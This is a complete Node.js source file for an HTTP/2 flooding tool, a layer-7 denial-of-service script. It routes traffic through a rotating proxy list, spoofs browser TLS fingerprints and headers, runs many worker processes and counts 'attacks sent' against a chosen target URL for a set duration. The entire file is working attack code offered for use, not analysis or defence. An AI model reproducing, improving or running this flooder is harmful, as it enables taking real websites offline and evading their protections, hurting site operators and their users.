const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");

// Increase listeners, essential for high-concurrency tasks
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const SCRIPT_VERSION = "2.0.0_Improved";

// --- Argument Parsing and Validation ---
if (process.argv.length < 6) {
    console.log(`Usage: node ${process.argv[1]} URL TIME REQ_PER_SEC THREADS PROXY_FILE [UA_FILE]`);
    console.log(`Example: node ${process.argv[1]} https://example.com 60 10 4 proxy.txt ua.txt`);
    console.log(`Version: ${SCRIPT_VERSION}`);
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3], 10),
    ratePerThread: parseInt(process.argv[4], 10), // Renamed for clarity
    threads: parseInt(process.argv[5], 10),
    proxyFile: process.argv[6],
    userAgentFile: process.argv[7] || "ua.txt" // Default ua.txt if not provided
};

if (isNaN(args.time) || args.time <= 0) {
    console.error("Error: TIME must be a positive number.");
    process.exit(1);
}
if (isNaN(args.ratePerThread) || args.ratePerThread <= 0) {
    console.error("Error: REQ_PER_SEC (ratePerThread) must be a positive number.");
    process.exit(1);
}
if (isNaN(args.threads) || args.threads <= 0) {
    console.error("Error: THREADS must be a positive number.");
    process.exit(1);
}

let parsedTarget;
try {
    parsedTarget = url.parse(args.target);
    if (!parsedTarget.protocol || !parsedTarget.host) {
        throw new Error("Invalid target URL format.");
    }
} catch (error) {
    console.error(`Error parsing target URL: ${error.message}`);
    process.exit(1);
}

// --- TLS Configuration (similar to original, can be further customized) ---
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method"; // Changed to TLS_client_method for broader compatibility
const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true, // Server chooses based on its preference list if true
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
});

// --- Helper Functions ---
function readLines(filePath) {
    if (!fs.existsSync(filePath)) {
        console.error(`Error: File not found - ${filePath}`);
        // In master, this would cause exit. In worker, it might be handled differently or ignored if proxies/UAs are optional.
        // For simplicity, master checks this and exits if essential files are missing.
        if (cluster.isMaster) process.exit(1);
        return []; // Worker returns empty if file missing (master should catch this)
    }
    try {
        return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(Boolean); // Filter out empty lines
    } catch (error) {
        console.error(`Error reading file ${filePath}: ${error.message}`);
        if (cluster.isMaster) process.exit(1);
        return [];
    }
}

function randomElement(elements) {
    if (!elements || elements.length === 0) return undefined;
    return elements[Math.floor(Math.random() * elements.length)];
}

// --- Load Proxies and User Agents ---
let proxies = [];
let userAgents = [];

// --- NetSocket Class (for proxy connection) ---
class NetSocket {
    constructor() { }
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        let connection;

        try {
            connection = net.connect({
                host: options.host,
                port: options.port,
                allowHalfOpen: true,
                writable: true,
                readable: true
            });
        } catch (error) {
             // This typically won't throw here, but on 'error' event
            return callback(undefined, `error: connection establishment failed to proxy - ${error.message}`);
        }


        connection.setTimeout(options.timeout * 1000); // options.timeout is in seconds
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, `error: invalid response from proxy - "${response.substring(0, 100)}"`);
            }
            // Successfully connected through proxy
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: proxy connection timeout");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, `error: proxy connection error - ${error.message}`);
        });

        connection.on("end", () => {
            connection.destroy();
            // Potentially callback with an error if connection ended prematurely
        });
    }
}
const Socker = new NetSocket();


// --- Master Process Logic ---
if (cluster.isMaster) {
    console.log(`[Master PID: ${process.pid}] Script Version: ${SCRIPT_VERSION} Initializing...`);
    console.log(`Target: ${args.target}`);
    console.log(`Duration: ${args.time} seconds`);
    console.log(`Requests/sec/thread: ${args.ratePerThread}`);
    console.log(`Total Threads: ${args.threads}`);
    console.log(`Total Est. RPS: ${args.ratePerThread * args.threads}`);
    console.log(`Proxy File: ${args.proxyFile}`);
    console.log(`User-Agent File: ${args.userAgentFile}`);

    proxies = readLines(args.proxyFile);
    if (proxies.length === 0) {
        console.error("Error: Proxy list is empty or file not found. Exiting.");
        process.exit(1);
    }
    console.log(`Loaded ${proxies.length} proxies.`);

    userAgents = readLines(args.userAgentFile);
    if (userAgents.length === 0) {
        console.warn("Warning: User-Agent list is empty or file not found. Using a default User-Agent.");
        userAgents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36");
    } else {
        console.log(`Loaded ${userAgents.length} user-agents.`);
    }

    let totalAttacksSent = 0;
    let totalErrors = 0;
    const workerStats = {};

    for (let i = 0; i < args.threads; i++) {
        const worker = cluster.fork();
        workerStats[worker.id] = { attacks: 0, errors: 0 };
        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                workerStats[worker.id].attacks += msg.attacksSent;
                workerStats[worker.id].errors += msg.errorsReported;
                totalAttacksSent += msg.attacksSent;
                totalErrors += msg.errorsReported;
            } else if (msg.type === 'log') {
                console.log(`[Worker ${worker.id}]: ${msg.message}`);
            }
        });
    }

    const statsInterval = setInterval(() => {
        const totalMem = os.totalmem();
        const freeMem = os.freemem();
        const usedMem = totalMem - freeMem;
        const ramUsage = (usedMem / totalMem) * 100;
        console.log(`[Master Stats] Total Requests: ${totalAttacksSent} | Total Errors: ${totalErrors} | RAM: ${ramUsage.toFixed(2)}%`);

        // RAM Check (Simplified from original - consider more sophisticated worker management)
        if (ramUsage > 95) { // Increased threshold
            console.warn("[Master] High RAM usage detected! Consider restarting workers if issues persist.");
            // Original script restarted all workers. This can be disruptive.
            // For now, just logging. A more robust solution would identify problematic workers.
        }
    }, 5000); // Log stats every 5 seconds

    console.log(`[Master] ${args.threads} workers started. Attack commencing for ${args.time} seconds.`);

    // Shutdown logic
    const attackTimeout = setTimeout(() => {
        console.log("[Master] Attack duration reached. Signaling workers to stop...");
        for (const id in cluster.workers) {
            cluster.workers[id].send('shutdown');
        }
        clearInterval(statsInterval); // Stop logging stats
        // Give workers a moment to shut down before exiting
        setTimeout(() => {
            console.log("[Master] Exiting.");
            process.exit(0);
        }, 5000); // Wait 5s for workers to report final stats / close
    }, args.time * 1000);

    process.on('SIGINT', () => {
        console.log("[Master] SIGINT received. Shutting down gracefully...");
        clearTimeout(attackTimeout); // Clear the main timeout
        for (const id in cluster.workers) {
            if (cluster.workers[id]) {
                 cluster.workers[id].send('shutdown');
            }
        }
        clearInterval(statsInterval);
        setTimeout(() => {
            console.log("[Master] Exiting due to SIGINT.");
            process.exit(0);
        }, 5000);
    });

    cluster.on('exit', (worker, code, signal) => {
        console.log(`[Master] Worker ${worker.process.pid} (ID: ${worker.id}) died (code: ${code}, signal: ${signal}).`);
        // Optionally, restart a worker if it dies unexpectedly before shutdown signal
        // if (!worker.exitedAfterDisconnect) {
        //     console.log(`[Master] Restarting worker ${worker.id}...`);
        //     cluster.fork();
        // }
    });

} else {
    // --- Worker Process Logic ---
    let isShuttingDown = false;
    let attackInterval;
    let activeClient = null; // To hold the active http2 client
    let activeProxyConnection = null; // To hold the underlying net.Socket for the proxy
    let currentProxyAddr = null;

    // Load proxies and UAs in worker (passed via master or re-read if master doesn't pass them)
    // For simplicity, assuming master has validated and they are available.
    // If not, worker needs its own readLines and error handling for files.
    // The master already reads them, so we could pass them in the fork environment or via messages.
    // However, for large files, it's better for each worker to read if memory is a concern for IPC.
    // Let's assume for now that master will handle exiting if files are missing.
    // Workers will get them via global scope (less ideal but simpler for this example).
    // A better way: master sends a chunk of proxies to each worker.

    proxies = readLines(args.proxyFile); // Workers re-read, can be optimized
    userAgents = readLines(args.userAgentFile);
     if (userAgents.length === 0) {
        userAgents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36");
    }


    function logWorker(message) {
        // process.send({ type: 'log', message: message }); // Can be too verbose
        // console.log(`[Worker ${cluster.worker.id} PID: ${process.pid}] ${message}`); // Direct log
    }

    function reportStats(attacksSent, errorsReported) {
        if (attacksSent > 0 || errorsReported > 0) {
            process.send({ type: 'stats', attacksSent, errorsReported });
        }
    }


    function makeRequest(client) {
        if (isShuttingDown || !client || client.destroyed || client.closed) {
            if (attackInterval) clearInterval(attackInterval);
            return;
        }

        const baseHeaders = {
            ":method": "GET",
            ":path": parsedTarget.path,
            ":scheme": "https",
            ":authority": parsedTarget.host,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9", // Simplified
            "accept-encoding": "gzip, deflate, br",
            "sec-ch-ua-mobile": randomElement(["?0", "?1"]),
            "sec-ch-ua-platform": randomElement(["Android", "iOS", "Linux", "macOS", "Windows", "Unknown"]),
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none", // 'same-origin' or 'cross-site' might be more common. 'none' for direct nav.
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": randomElement(userAgents) || "Mozilla/5.0",
            "cache-control": "no-cache",
            "referer": `https://${parsedTarget.host}/`, // Basic referer
            "x-forwarded-proto": "https"
            // "x-forwarded-for": currentProxyAddr ? currentProxyAddr.split(":")[0] : undefined // Set if proxy is used
        };
        if (currentProxyAddr) {
            baseHeaders["x-forwarded-for"] = currentProxyAddr.split(":")[0];
        }


        try {
            const request = client.request(baseHeaders);
            request.setEncoding('utf8');

            request.on("response", (responseHeaders) => {
                // logWorker(`Response: ${responseHeaders[':status']}`); // Can be very verbose
                // You might want to check status codes here for success/failure rate
                request.close(); // Close the stream after getting headers
            });

            request.on("data", (chunk) => { /* Consume data if any */ });
            request.on("end", () => {
                // logWorker("Request stream ended.");
                if (!request.destroyed) request.destroy();
            });
            request.on("error", (err) => {
                // logWorker(`Request error: ${err.message}`);
                reportStats(0, 1);
                if (!request.destroyed) request.destroy();
            });
            request.end();
            reportStats(1, 0);
        } catch (error) {
            // logWorker(`Error sending request: ${error.message}`);
            reportStats(0, 1);
            // If client is unusable, trigger reconnection
            if (activeClient && (activeClient.destroyed || activeClient.closed)) {
                 cleanupConnections();
                 setTimeout(runFlooder, 1000); // Attempt to reconnect after a delay
            }
        }
    }

    function setupAttackLoop(client) {
        if (isShuttingDown) return;
        activeClient = client; // Store the active client

        const intervalMs = Math.max(10, 1000 / args.ratePerThread); // Ensure interval isn't too small
        
        if (attackInterval) clearInterval(attackInterval); // Clear previous interval if any

        attackInterval = setInterval(() => {
            if (isShuttingDown || !activeClient || activeClient.destroyed || activeClient.closed) {
                clearInterval(attackInterval);
                if (!isShuttingDown) { // If not shutting down, means connection died
                    logWorker("Connection died, attempting to reconnect...");
                    cleanupConnections();
                    setTimeout(runFlooder, 2000 + Math.random() * 3000); // Staggered reconnect
                }
                return;
            }
            // Send a burst of requests if rate is high, or one by one if rate is low.
            // For simplicity, sending one request per interval tick.
            // If args.ratePerThread is e.g. 100, intervalMs is 10ms. So 100 req/s.
            makeRequest(activeClient);
        }, intervalMs);

        client.on("close", () => {
            logWorker("HTTP/2 client closed.");
            reportStats(0,1); // count as an error if unexpected
            clearInterval(attackInterval);
            cleanupConnections(); // Clean up proxy socket too
            if (!isShuttingDown) {
                setTimeout(runFlooder, 3000 + Math.random() * 2000); // Attempt to reconnect after a delay
            }
        });

        client.on("error", (error) => {
            logWorker(`HTTP/2 client error: ${error.message}`);
            reportStats(0,1);
            clearInterval(attackInterval);
            cleanupConnections();
            if (!isShuttingDown) {
                setTimeout(runFlooder, 3000 + Math.random() * 2000); // Attempt to reconnect
            }
        });
        
        // Optional: Send GOAWAY frame when shutting down for cleaner close, though client.close() should handle it.
        // client.goaway(0, http2.constants.NGHTTP2_NO_ERROR, Buffer.from('Graceful shutdown'));
    }
    
    function cleanupConnections() {
        if (attackInterval) clearInterval(attackInterval);
        attackInterval = null;

        if (activeClient && !activeClient.destroyed) {
            activeClient.destroy();
        }
        activeClient = null;

        if (activeProxyConnection && !activeProxyConnection.destroyed) {
            activeProxyConnection.destroy();
        }
        activeProxyConnection = null;
        currentProxyAddr = null;
    }


    function runFlooder() {
        if (isShuttingDown || proxies.length === 0) {
            if (proxies.length === 0) logWorker("No proxies available to run flooder.");
            return;
        }

        currentProxyAddr = randomElement(proxies);
        if (!currentProxyAddr) {
            logWorker("Failed to select a proxy.");
            if (!isShuttingDown) setTimeout(runFlooder, 5000); // Retry after a delay
            return;
        }
        const parsedProxy = currentProxyAddr.split(":");
        if (parsedProxy.length < 2) {
            logWorker(`Invalid proxy format: ${currentProxyAddr}. Skipping.`);
            if (!isShuttingDown) setTimeout(runFlooder, 100); // Try next quickly
            return;
        }


        const proxyOptions = {
            host: parsedProxy[0],
            port: parseInt(parsedProxy[1], 10),
            address: parsedTarget.host, // Target host for CONNECT request
            timeout: 10 // Proxy connection timeout in seconds
        };

        Socker.HTTP(proxyOptions, (proxySocket, error) => {
            if (error) {
                logWorker(`Proxy connection failed (${currentProxyAddr}): ${error}`);
                reportStats(0, 1);
                cleanupConnections(); // Clean up any partial state
                if (!isShuttingDown) setTimeout(runFlooder, 2000 + Math.random() * 3000); // Retry with new proxy after delay
                return;
            }
            
            activeProxyConnection = proxySocket; // Store the proxy socket

            const tlsOptions = {
                socket: proxySocket, // Tunnel TLS through the proxy socket
                ALPNProtocols: ["h2"],
                servername: parsedTarget.host,
                host: parsedTarget.host, // Added for SNI
                secureContext: secureContext, // Use the pre-created secure context
                rejectUnauthorized: false, // Common for these tools, but be aware of implications
                ciphers: ciphers, // Redundant if in secureContext, but explicit
                sigalgs: sigalgs, // Redundant if in secureContext
                ecdhCurve: ecdhCurve, // Redundant if in secureContext
                // secureOptions: secureOptions, // Already in secureContext
                // honorCipherOrder: true, // Already in secureContext
                // secureProtocol: secureProtocol // Already in secureContext
                requestCert: true, // Request a certificate from the server
                session: undefined // Try to disable session resumption client-side for more TLS handshakes
            };

            // `tls.connect` will use `proxySocket` for communication.
            // The host/port for `tls.connect` are for the TLS layer, not for opening a new socket.
            // Since socket is provided, host/port in tls.connect might be ignored by some versions for direct socket connection,
            // but servername and host in options are important for SNI and certificate validation.
            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions, () => {
                 // Callback for secureConnect
                 logWorker(`TLS connected to ${parsedTarget.host} via ${currentProxyAddr}`);

                const client = http2.connect(parsedTarget.href, {
                    createConnection: () => tlsConn, // Use the established TLS connection
                    settings: {
                        enablePush: false,
                        initialWindowSize: 1073741823, // Large initial window size
                        maxHeaderListSize: 262144, // Increased max header list size
                    },
                    maxSessionMemory: 5000, // Limit memory per session
                    // maxDeflateDynamicTableSize: 4294967295 // default
                });
                
                setupAttackLoop(client); // This will handle client errors and closures
            });
            
            tlsConn.on('error', (tlsError) => {
                logWorker(`TLS connection error (${currentProxyAddr} -> ${parsedTarget.host}): ${tlsError.message}`);
                reportStats(0, 1);
                cleanupConnections();
                if (!isShuttingDown) setTimeout(runFlooder, 3000 + Math.random() * 2000);
            });

            // If proxySocket closes/errors before TLS is established or during TLS handshake
            proxySocket.on('close', () => {
                // If TLS connection is not yet established or has errored, this might trigger a retry.
                if (!tlsConn || !tlsConn.authorized) { // tlsConn.authorized is true after successful handshake
                    logWorker(`Proxy socket closed prematurely for ${currentProxyAddr}.`);
                     // No need to call cleanupConnections() here as tlsConn error or proxySocket error will handle it
                }
            });
            // Proxy socket errors are already handled by Socker.HTTP if they occur *after* initial connect.
            // If they occur *during* initial connect, Socker.HTTP callback gets the error.
        });
    }

    // Initial call to start the process in the worker
    runFlooder();

    process.on('uncaughtException', (err) => {
        console.error(`[Worker ${cluster.worker.id}] Uncaught Exception: ${err.message}`, err.stack);
        reportStats(0, 1);
        cleanupConnections();
        // Exiting worker on major uncaught exception to allow master to restart it if configured.
        process.exit(1); 
    });
    process.on('unhandledRejection', (reason, promise) => {
        console.error(`[Worker ${cluster.worker.id}] Unhandled Rejection at:`, promise, 'reason:', reason);
        reportStats(0, 1);
        cleanupConnections();
        process.exit(1);
    });

    process.on('message', (msg) => {
        if (msg === 'shutdown') {
            logWorker("Shutdown signal received. Cleaning up...");
            isShuttingDown = true;
            cleanupConnections();
            // Give a little time for stats to be sent if any inflight
            setTimeout(() => {
                logWorker("Exiting.");
                process.exit(0);
            }, 500);
        }
    });
}